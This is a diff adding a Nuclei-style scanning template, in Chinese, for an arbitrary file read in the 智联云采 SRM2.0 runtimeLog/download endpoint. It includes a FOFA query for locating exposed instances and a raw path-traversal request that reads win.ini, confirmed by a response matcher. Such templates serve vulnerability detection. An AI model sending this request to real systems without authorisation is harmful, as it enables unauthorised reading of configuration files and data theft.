@@ -1,0 +1,35 @@
+id: zhilianyuncai-runtimeLog_download-File-reading
+
+info:
+  name: "智联云采 SRM2.0 runtimeLog 接口任意文件读取"
+  author: Unknown
+  severity: high
+  description: |-
+    fofa: title=="SRM 2.0"
+    智联云采 SRM2.0 系统中 runtimeLog/download 接口存在文件访问控制缺陷，攻击者可利用该接口实现未经授权的文件访问，进而获取敏感信息（如数据库配置、系统配置文件等），可能导致系统被进一步入侵或数据泄露。
+  reference:
+  - https://mp.weixin.qq.com/s?__biz=MzkzMTcwMTg1Mg==&mid=2247486585&idx=1&sn=cb0e73248e17310c50f333948569d15f&chksm=c267b94af510305cc7e8dd1d7aec83c435800f097bfc39c0c87b7b1ebb5dfe79cadaaea4bb14&token=1628549949&lang=zh_CN#rd
+  tags: 智联云采
+
+
+
+http:
+- raw:
+  - |
+    GET /adpweb/static/%2e%2e;/a/sys/runtimeLog/download?path=c:\\windows\win.ini HTTP/1.1
+    Host: {{Hostname}}
+    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:129.0) Gecko/20100101 Firefox/129.0
+
+  matchers-condition: and
+  matchers:
+  - type: word
+    part: body
+    words:
+    - '; for 16-bit app support'
+  - type: status
+    status:
+    - 200
+
+
+
+
